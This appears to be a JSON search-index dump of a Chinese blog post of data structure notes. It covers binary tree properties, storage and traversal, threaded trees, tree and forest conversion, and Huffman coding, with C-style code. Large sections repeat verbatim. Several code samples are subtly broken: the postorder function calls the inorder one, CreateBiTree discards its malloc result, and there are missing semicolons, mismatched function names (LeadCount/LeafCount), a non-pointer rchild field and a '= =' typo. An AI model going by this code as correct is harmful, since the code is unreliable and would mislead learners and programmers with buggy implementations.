while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#计算二叉树结点总数"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#计算二叉树叶子结点总数"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#线索二叉树"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#树和森林"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#树的存储结构"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 